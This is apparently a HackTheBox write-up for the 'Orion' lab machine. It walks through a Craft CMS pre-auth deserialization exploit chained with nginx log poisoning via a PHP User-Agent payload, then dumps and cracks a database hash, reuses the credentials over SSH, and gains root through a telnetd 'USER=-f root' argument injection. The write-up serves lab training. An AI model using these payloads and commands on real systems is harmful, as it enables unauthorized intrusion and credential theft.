# Orion - HackTheBox

Linux machine exposing only SSH and an outdated Craft CMS. An unauthenticated
deserialization flaw allows arbitrary file inclusion, which combined with nginx log
poisoning gives remote code execution. Database credentials sitting in the application
config lead to a crackable user hash, and a telnet daemon bound to loopback accepts an
argument injection that bypasses authentication entirely.

Target: `10.129.95.138` (`orion.htb`)

---

## Reconnaissance

```bash
echo "10.129.95.138 orion.htb" >> /etc/hosts
nmap -sC -sV -p- 10.129.95.138
```

Only two ports reachable from outside:

- SSH (22) - OpenSSH
- HTTP (80) - nginx, serving Craft CMS 5.6.16

The CMS version is the entire attack surface. Craft CMS 5.6.16 is affected by
CVE-2025-32432, an unauthenticated remote code execution.

---

## Exploitation

### CVE-2025-32432 - Craft CMS Pre-Auth RCE

The vulnerability is an unauthenticated Yii2 deserialization on the
`/actions/assets/generate-transform` endpoint. The gadget chain runs through
`FieldLayoutBehavior` into `PhpManager`, which performs a `require_once($itemFile)`
on an attacker controlled path.

The primitive is arbitrary file inclusion, not direct code execution. Any file on
disk containing PHP will be parsed and executed, so the exploit needs a file the
attacker can write into.

### Log Poisoning via User-Agent

The nginx access log records the User-Agent header verbatim, which makes it a writable
file reachable through an unauthenticated HTTP request.

1. Request `/index.php?p=admin/login` to obtain `CraftSessionId` and `CRAFT_CSRF_TOKEN`
2. Send a request with PHP code in the User-Agent header
3. Identify a valid `assetId`, any existing asset in the CMS
4. Send the deserialization payload with `itemFile` pointing at the log
5. The log is loaded as PHP and the command output comes back in the response

```
User-Agent: <?php system('id'); return []; ?>
```

```
itemFile = /var/log/nginx/access.log
```

The trailing `return []` matters: the included file has to return a value the
application can keep working with, otherwise execution breaks before the output
is rendered.

### Outbound Filtering - No Reverse Shell

A direct reverse shell never connects back. Commands execute and their output is
returned over HTTP, but no callback ever arrives on the listener.

That combination is the diagnostic signal: if execution clearly works but the
callback never lands, the problem is egress filtering, not the payload. This box
blocks outbound connections entirely.

The Metasploit module solves it by driving the session over the HTTP channel that
is already established, with no callback required:

```bash
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
```

Meterpreter session as `www-data`.

---

## Post-Exploitation - Application Config to Database

The first file worth reading after landing on a CMS web server is the environment
file. Craft keeps database credentials there in cleartext:

```bash
cat /var/www/html/craft/.env
```

```
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

Database root, straight out of a readable config file.

```bash
mysql -u root -p'SuperSecureCraft123Pass!' craft
```

```sql
SELECT username, email, password FROM users;
```

```
adam@orion.htb : $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

The `$2y$` prefix identifies bcrypt, which is hashcat mode 3200:

```bash
hashcat -m 3200 hash.txt rockyou.txt
```

```
darkangel
```

---

## Lateral Movement - Credential Reuse

The application password works unchanged on the system account:

```bash
ssh adam@10.129.95.138
```

User flag is in `/home/adam/user.txt`.

---

## Privilege Escalation - CVE-2026-24061 (telnetd Auth Bypass)

The external scan showed only two ports. Local enumeration shows a third:

```bash
ss -tulnp
```

```
tcp   LISTEN   0   1   127.0.0.1:23   0.0.0.0:*
```

`telnetd 2.7` from inetutils, bound to loopback only and therefore invisible to any
external scan. It has no relationship whatsoever with Craft CMS: without local
enumeration this vector would never have surfaced.

The daemon passes the `USER` environment variable straight to `login` as an argument.
A value beginning with a dash is parsed as a flag rather than a username, and `login -f`
means "user is already authenticated, skip verification":

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root flag is in `/root/root.txt`.

---

## Key Takeaways

- When command execution works but no reverse shell connects, the problem is egress
  filtering, not the payload. Check outbound reachability before rewriting the shell
  three times. Exploits that reuse an already established channel are the answer on
  boxes with no outbound.
- Arbitrary file inclusion is not remote code execution by itself. It becomes RCE only
  when paired with a file the attacker can write into. Web server logs are the classic
  pairing, because any request header ends up on disk.
- Application config files are the shortest path from a web shell to real credentials.
  `.env` held database root, the database held the user hash, the hash cracked to a
  password reused on SSH. Three steps, all of them from one readable file.
- `ss -tulnp` belongs in every post-exploitation checklist alongside `sudo -l`,
  SUID and `getcap -r /`. Services bound to `127.0.0.1` are invisible to external
  scans and are frequently the privilege escalation path.
- Any daemon that passes user controlled input as an argument to another program is
  an argument injection candidate. Here `USER` reaches `login` unsanitised, and a
  leading dash turns a username into a flag.

---

## Disclaimer

This box was completed in the controlled, legal environment provided by HackTheBox.
All actions were performed strictly for educational purposes.
